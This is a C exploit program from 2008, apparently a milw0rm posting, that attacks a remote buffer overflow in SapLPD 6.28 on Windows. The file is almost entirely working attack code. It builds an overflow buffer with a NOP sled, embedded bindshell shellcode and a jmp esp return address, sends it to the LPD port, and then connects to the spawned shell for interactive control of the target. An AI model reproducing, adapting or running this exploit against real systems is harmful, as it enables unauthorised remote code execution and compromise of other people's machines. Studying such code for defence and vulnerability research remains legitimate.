/*
	http://lists.grok.org.uk/pipermail/full-disclosure/2008-February/060042.html

	Exploit for SapLPD 6.28 Win32 by BackBone
	Tested with SapLPD 6.28 on Windows XP SP2

	Groetjes aan mijn sletjes Ops,Doop,Gabber,head,ps,sj,dd en de rest!
*/

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment (lib,"ws2_32")

#define DEFAULT_PORT 515

char ASCII_SHIT[]=
"\r\n"
"\t\t   ______              ______\r\n"  
"\t\t  (, /   )        /)  (, /   )\r\n"
"\t\t    /---(  _   _ (/_    /---(  _____    _\r\n" 
"\t\t ) / ____)(_(_(__/(__) / ____)(_) / (__(/_\r\n"
"\t\t(_/ (               (_/ (    (c) 2008\r\n"
"\r\n";

struct
{
	LPSTR lpVersion;
	DWORD dwOffset;
	DWORD dwRetAddr;
	BYTE  bLPDCmd;
}
targets[]=
{
	// exploit works with cmd 0x01,0x02,0x03,...
	{"SAPLPD Version 6.28 for Windows/NT (TEST)",484,0x0012F0A1,0x01}, // addr of shellcode -> 0x0012F0A1
	{"SAPLPD Version 6.28 for Windows/NT",484,0x004E0BB7,0x01}, // jmp esp 0x004E0BB7 -> SAPLpd.exe 6.28
},v;


// don't change the offset
#define PORT_OFFSET 170
#define BIND_PORT   10282

// bindshell shellcode from www.metasploit.com,mod by skylined
unsigned char shellcode[] =
  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89";

#define SET_BIND_PORT(p) *(USHORT*)(shellcode+PORT_OFFSET)=htons(p);

BOOL StartupWinsock(void)
{
	WSADATA wsa;

	return !WSAStartup(MAKEWORD(2,0),&wsa);
}

DWORD LookupAddress(LPSTR lpHost)
{
	DWORD dwRemoteAddr=inet_addr(lpHost);

	if (dwRemoteAddr==INADDR_NONE)
	{
		struct hostent* pHostEnt=gethostbyname(lpHost);
		if (pHostEnt==0)
			return INADDR_NONE;
		dwRemoteAddr = *((DWORD*)pHostEnt->h_addr_list[0]);
	}

	return dwRemoteAddr;
}

SOCKET TCPConnect(DWORD dwIP,WORD wPort,DWORD dwTimeout)
{
	struct sockaddr_in sock_in;
	struct timeval timeout;
	DWORD fdWrite[2];
	DWORD fdExcept[2];
	SOCKET s;
	int slResult;
	int val=1,len=sizeof(int);
	
	s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (s==INVALID_SOCKET)
		return SOCKET_ERROR;

	ioctlsocket(s,FIONBIO,(u_long*)&val);

	fdWrite[0]=fdExcept[0]=1;
	fdWrite[1]=fdExcept[1]=s;

	memset(&sock_in,0,sizeof(sock_in));
	sock_in.sin_port=wPort;
	sock_in.sin_family=AF_INET;
	sock_in.sin_addr.s_addr=dwIP;

	connect(s,(struct sockaddr*)&sock_in,sizeof(sock_in));

	timeout.tv_sec=dwTimeout/1000;
	timeout.tv_usec=dwTimeout%1000;

	slResult=select(0,NULL,(fd_set*)&fdWrite,(fd_set*)&fdExcept,&timeout);
	switch(slResult)
	{
		case -1:
		case 0:
		{
			closesocket(s);
			return SOCKET_ERROR;
		}

		default:
		{
			if (!FD_ISSET(s,(fd_set*)&fdExcept)) 
			{
				val=0;ioctlsocket(s,FIONBIO,(u_long*)&val);
				return s;
			}
			break;
		}
	}

	closesocket(s);
	return SOCKET_ERROR;
}

/* ripped from TESO code and modifed by ey4s for win32 */
void Shell(int s)
{
	int l;
	char buf[512];
	struct timeval time;
	unsigned long ul[2];

	time.tv_sec=1;
	time.tv_usec=0;

	while(1)
	{
		ul[0]=1;
		ul[1]=s;

		l=select(0,(fd_set*)&ul,NULL,NULL,&time);
		if(l==1)
		{
			l=recv(s,buf,sizeof(buf),0);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
			l=write(1,buf,l);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
		}
		else
		    {
			l=read(0,buf,sizeof(buf));
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
			l=send(s,buf,l,0);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
		}
	}
}

void ShowBanner(void)
{
	printf("%s",ASCII_SHIT);
}

void ShowSploit(void)
{
	printf("\t\tSAPlpd 6.28 Multiple Remote Buffer Overflows\r\n");
	printf("\t\t        Advisory by Luigi Auriemma\r\n");
	printf("\t\t           Exploit By BackBone\r\n");
	printf("\r\n");
}

void ShowUsage(char* argv)
{
	int i;

	printf("[*] %s host/ip[:port] target [bindport]\r\n",argv);
	printf("[*] Default port: %d - Default bindport: %d\r\n",DEFAULT_PORT,BIND_PORT);
	printf("[*] Target(s):\r\n\r\n");
	for (i=0;i<(sizeof(targets)/sizeof(v));i++)
		printf("\t%2d: %s (0x%08x)\r\n",i,targets[i].lpVersion,targets[i].dwRetAddr);
}

int main(int argc, char* argv[])
{
	LPSTR lpHost,lpPort;
	ULONG ulIP;
	USHORT usPort;
	USHORT usBindPort;
	SOCKET sSock;
	int iTarget;
	int iLen=0;
	char lpBuffer[16384];

	ShowBanner();
	ShowSploit();

	// check arguments
	if (argc<3||argc>4)
	{
		ShowUsage(argv[0]);
		return -1;
	}

	// get host/ip
	lpHost=strtok(argv[1],":");
	// get port
	lpPort=strtok(NULL,":");
	if (lpPort)	usPort=(USHORT)atoi(lpPort);
	else usPort=DEFAULT_PORT;

	// startup winsock
	if (!StartupWinsock())
	{
		printf("[-] WSAStartup() Failed.\r\n");
		return -1;
	}

	// resolve host
	ulIP=LookupAddress(lpHost);
	if (ulIP==INADDR_NONE)
	{
		printf("[-] Invalid IP/Host.\r\n");
		WSACleanup();
		return -1;
	}

	// get target 
	iTarget=atoi(argv[2]);
	if (iTarget<0||iTarget>(sizeof(targets)/sizeof(v))-1)
	{
		printf("[-] Invalid target.\r\n");
		WSACleanup();
		return -1;
	}

	printf("[+] Target: %s (0x%08x)\r\n",targets[iTarget].lpVersion,targets[iTarget].dwRetAddr);

	if (argc==4) usBindPort=(USHORT)atoi(argv[3]);
	else usBindPort=BIND_PORT;
	SET_BIND_PORT(usBindPort);

	// connecting
	printf("[+] Connecting to %d.%d.%d.%d:%d ... ",ulIP&0xFF,(ulIP>>8)&0xFF,
		(ulIP>>16)&0xFF,(ulIP>>24)&0xFF,usPort);

	// connect
	sSock=TCPConnect(ulIP,htons(usPort),10000);
	if (sSock==SOCKET_ERROR)
	{
		printf("Failed!\r\n");
		WSACleanup();
		return -1;
	}

	printf("Ok.\r\n");

	// construct buffer
	memset(lpBuffer,0,sizeof(lpBuffer));

	*lpBuffer=targets[iTarget].bLPDCmd;
	iLen+=1;

	memset(lpBuffer+iLen,0x90,targets[iTarget].dwOffset-sizeof(shellcode));
	iLen+=targets[iTarget].dwOffset-sizeof(shellcode);

	memcpy(lpBuffer+iLen,shellcode,sizeof(shellcode));
	iLen+=sizeof(shellcode);

	memcpy(lpBuffer+iLen,&targets[iTarget].dwRetAddr,4);
	iLen+=4;	

	memcpy(lpBuffer+iLen,"\xE9\x98\x08\x00\x00",5); // jmp esp will execute this code, jmp to shellcode
	iLen+=5;

	memset(lpBuffer+iLen,0x41,1);// saplpd zeroes this byte
	iLen+=1;

	printf("[+] Sending buffer (size:%d) ... ",iLen);

	// send buffer
	if (send(sSock,lpBuffer,iLen,0)<=0)
	{
		printf("Failed!\r\n");
		WSACleanup();
		return -1;
	}

	printf("Ok.\r\n");
	
	closesocket(sSock);

	Sleep(1000);

	// connecting
	printf("[+] Connecting to %d.%d.%d.%d:%d ... ",ulIP&0xFF,(ulIP>>8)&0xFF,
		(ulIP>>16)&0xFF,(ulIP>>24)&0xFF,usBindPort);

	// connect to bindshell
	sSock=TCPConnect(ulIP,htons(usBindPort),10000);
	if (sSock==SOCKET_ERROR)
	{
		printf("Failed!\r\n");
		WSACleanup();
		return -1;
	}

	printf("Ok.\r\n\r\n");

	// shell
	Shell(sSock);

	closesocket(sSock);

	WSACleanup();
	
	return 0;
}

// milw0rm.com [2008-02-07]
